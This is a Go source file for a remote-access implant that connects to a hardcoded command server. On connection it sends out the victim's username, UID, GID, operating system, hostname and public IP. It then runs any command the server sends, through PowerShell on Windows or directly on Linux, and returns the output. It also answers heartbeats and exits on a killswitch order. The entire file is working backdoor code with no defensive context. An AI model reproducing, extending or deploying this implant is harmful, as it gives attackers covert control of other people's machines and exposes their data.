package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
)

type Client struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
	PublicIP        string
}

type Instructions struct {
	IsHeartbeat  bool
	IsCommand    bool
	IsKillswitch bool
	Message      string
}

type Response struct {
	Successful bool
	Message    string
}

var (
	RemoteIP   = "192.168.1.181"
	RemotePort = "1302"
)

func main() {
	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
	if err != nil {
		log.Fatalf("Error happened connecting to server: %v\n", err)
	}
	defer conn.Close()
	if err := sendOSInfo(conn); err != nil {
		log.Fatal(err)
	}
	for {
		if err := awaitInstructions(conn); err != nil {
			log.Fatalf("Error happened awaiting instructions: %v\n", err)
		}
	}
}

func getIP() (string, error) {
	res, err := http.Get("https://ip.bulgariu.xyz")
	if err != nil {
		return "", nil
	}
	resbody, err := io.ReadAll(res.Body)
	if err != nil {
		return "", nil
	}
	ip := strings.TrimRight(string(resbody), "\n")
	return ip, nil
}

func sendOSInfo(conn net.Conn) error {
	currentUser, err := user.Current()
	if err != nil {
		e := fmt.Errorf("Error happened getting user: %v\n", err)
		return e
	}

	clientHostname, err := os.Hostname()
	if err != nil {
		e := fmt.Errorf("Error happened getting hostname: %v\n", err)
		return e
	}

	ip, err := getIP()
	if err != nil {
		e := fmt.Errorf("Error happened pulling IP: %v\n", err)
		return e
	}

	newClient := Client{
		Username:        currentUser.Username,
		UID:             currentUser.Uid,
		GID:             currentUser.Gid,
		OperatingSystem: runtime.GOOS,
		Hostname:        clientHostname,
		PublicIP:        ip,
	}

	enc := gob.NewEncoder(conn)
	err = enc.Encode(newClient)
	if err != nil {
		e := fmt.Errorf("Error happened sending OS info to server: %v\n", err)
		return e
	}

	return nil
}

func awaitInstructions(conn net.Conn) error {
	dec := gob.NewDecoder(conn)
	inst := Instructions{}
	err := dec.Decode(&inst)
	if err != nil {
		return err
	}

	switch {
	///////////////////////////////
	case inst.IsHeartbeat == true && inst.Message == "PING":
		if err := Heartbeat(conn); err != nil {
			return err
		}
		return nil
	///////////////////////////////
	case inst.IsCommand == true:
		executeCommand(conn, inst.Message)
	///////////////////////////////
	case inst.IsKillswitch == true:
		os.Exit(0)
	default:
		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
	}
	///////////////////////////////
	return nil
}

func Heartbeat(conn net.Conn) error {
	resp := Response{Successful: true, Message: "PONG"}
	err := sendMessage(resp, conn)
	if err != nil {
		return err
	}
	return nil
}

func executeCommand(conn net.Conn, command string) {
	var out []byte
	var err error

	formattedCommand := strings.Fields(command)
	switch runtime.GOOS {
	case "windows":
		t := []string{"-NoProfile"}
		t = append(t, formattedCommand...)
		out, err = exec.Command("powershell", t...).Output()
	case "linux":
		out, err = exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
	}
	if err != nil {
		errorMsg := fmt.Sprintf("%v\n", err)
		resp := Response{Successful: false, Message: errorMsg}
		sendMessage(resp, conn)
		return
	}
	resp := Response{
		Successful: true,
		Message:    string(out),
	}
	sendMessage(resp, conn)
}

func sendMessage(resp Response, conn net.Conn) error {
	enc := gob.NewEncoder(conn)
	err := enc.Encode(&resp)
	if err != nil {
		return err
	}
	return nil
}
